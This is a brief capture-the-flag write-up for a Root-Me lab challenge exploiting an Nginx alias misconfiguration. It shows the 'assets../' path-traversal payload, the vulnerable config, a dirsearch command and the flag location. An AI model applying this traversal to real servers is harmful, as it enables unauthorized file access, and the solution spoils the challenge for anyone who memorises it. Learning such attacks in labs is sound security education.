# Challenge15: 

## Ref

    + https://davidhamann.de/2022/08/14/nginx-alias-traversal/

## Nginx - Alias Misconfiguration

    1. Open Burp Suite and Go to the target url: http://challenge01.root-me.org:59092
    2. In the Burp Suite "Target" window, you can see there are 3 GET requests to:
        + /static/main.js
        + /assets (but not /assets/ :) )
        + /
    3. So thanks to the ref above, we can exploit the assets path like this:

```
assets../
```

    => The reason why we can exploit assets path like this is the nginx alias may look like this:

```
location /assets {
    alias /var/www/webapp/static/;
}

```
    => So when we request to "assets../", the path will translated to: "/var/www/webapp/static/../"

    4. So now we can access the main folder. Use the __dirsearch__ cmd to find the password:

```
dirsearch -u http://challenge01.root-me.org:59092/assets../
```

    5. The password store in flag.txt file:

```
http://challenge01.root-me.org:59092/assets../flag.txt
```
